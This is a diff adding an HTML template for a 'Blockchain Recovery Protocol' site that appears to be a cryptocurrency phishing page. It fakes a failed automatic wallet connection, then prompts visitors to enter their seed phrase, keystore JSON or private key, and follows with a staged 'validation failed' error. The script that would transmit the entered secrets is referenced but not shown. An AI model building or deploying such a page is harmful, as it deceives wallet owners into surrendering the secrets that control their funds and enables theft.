@@ -1,0 +1,144 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blockchain Recovery Protocol</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="container">
+        <div class="main-content">
+            <h1 class="title">BLOCKCHAIN<br>RECOVERY-<br>PROTOCOL</h1>
+            
+            <p class="description">
+                Welcome to Blockchain Recovery-Protocol, your trusted partner in 
+                decentralized wallet recovery and issue resolution. We're committed to helping 
+                users regain access and confidence in their non-custodial wallets.
+            </p>
+            
+            <div class="troubleshoot-section">
+                <label for="troubleshoot-select" class="troubleshoot-label">Troubleshoot an Issue</label>
+                <select id="troubleshoot-select" class="troubleshoot-dropdown">
+                    <option value="">Select an issue</option>
+                    <option value="wallet-access">Lost access to wallet</option>
+                    <option value="forgotten-password">Forgotten password</option>
+                    <option value="missing-funds">Missing funds</option>
+                    <option value="transaction-failed">Transaction failed</option>
+                    <option value="wallet-corrupted">Wallet corrupted</option>
+                    <option value="seed-phrase-lost">Seed phrase lost</option>
+                    <option value="private-key-issues">Private key issues</option>
+                    <option value="other">Other issues</option>
+                </select>
+            </div>
+            
+            <button id="connect-wallet-btn" class="connect-wallet-btn">Connect Wallet</button>
+        </div>
+    </div>
+
+    <!-- Wallet Selection Modal -->
+    <div id="wallet-modal" class="modal">
+        <div class="modal-content">
+            <h3>Connect your wallet</h3>
+            <div class="wallet-list">
+                <div class="wallet-item" data-wallet="metamask">
+                    <div class="wallet-icon">🦊</div>
+                    <span>Metamask</span>
+                </div>
+                <div class="wallet-item" data-wallet="trust">
+                    <div class="wallet-icon">🛡️</div>
+                    <span>Trust</span>
+                </div>
+                <div class="wallet-item" data-wallet="coinbase">
+                    <div class="wallet-icon">©</div>
+                    <span>Coinbase</span>
+                </div>
+                <div class="wallet-item" data-wallet="xumm">
+                    <div class="wallet-icon">✗</div>
+                    <span>Xumm</span>
+                </div>
+                <div class="wallet-item" data-wallet="cardano">
+                    <div class="wallet-icon">⚡</div>
+                    <span>Cardano</span>
+                </div>
+                <div class="wallet-item" data-wallet="daedalus">
+                    <div class="wallet-icon">🗲</div>
+                    <span>Daedalus</span>
+                </div>
+                <div class="wallet-item" data-wallet="yoroi">
+                    <div class="wallet-icon">🌊</div>
+                    <span>Yoroi</span>
+                </div>
+                <div class="wallet-item" data-wallet="ccvault">
+                    <div class="wallet-icon">🔒</div>
+                    <span>CCVault</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Connection Steps Modal -->
+    <div id="steps-modal" class="modal">
+        <div class="modal-content">
+            <div id="step-content">
+                <h3 id="step-title">Initializing</h3>
+                <p id="step-description">Trying to connect to wallet...</p>
+                <div class="loading-spinner"></div>
+            </div>
+            <div class="step-indicator">
+                <span class="step-dot"></span>
+                <span class="step-dot"></span>
+                <span class="step-dot"></span>
+                <span class="step-dot active"></span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Manual Import Modal -->
+    <div id="import-modal" class="modal">
+        <div class="modal-content">
+            <div class="error-message">
+                There was an error connecting automatically. But do not worry, you can still connect manually.
+            </div>
+            
+            <h3 id="import-title">Import your wallet</h3>
+            
+            <div class="import-options">
+                <button class="import-option active" data-option="seed">Seed Phrase</button>
+                <button class="import-option" data-option="keystore">Keystore JSON</button>
+                <button class="import-option" data-option="private">Private Key</button>
+            </div>
+            
+            <div class="import-form">
+                <label for="seed-input">Enter your wallet seed phrase</label>
+                <textarea id="seed-input" placeholder="Enter your seed phrase" rows="4"></textarea>
+                
+                <div class="form-actions">
+                    <button id="validate-btn" class="validate-btn">Validate</button>
+                    <button id="close-btn" class="close-btn">Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Validation Modal -->
+    <div id="validation-modal" class="modal">
+        <div class="modal-content">
+            <h3>Validating...</h3>
+            <div class="loading-spinner"></div>
+        </div>
+    </div>
+
+    <!-- Error Modal -->
+    <div id="error-modal" class="modal">
+        <div class="modal-content error-content">
+            <div class="error-icon">!</div>
+            <h3>We couldn't validate your account.</h3>
+            <p>Validation failed kindly connect to try again later-reach out to support team for immediate assistance</p>
+        </div>
+    </div>
+
+    <script src="{{ url_for('static', filename='script.js') }}"></script>
+</body>
+</html>
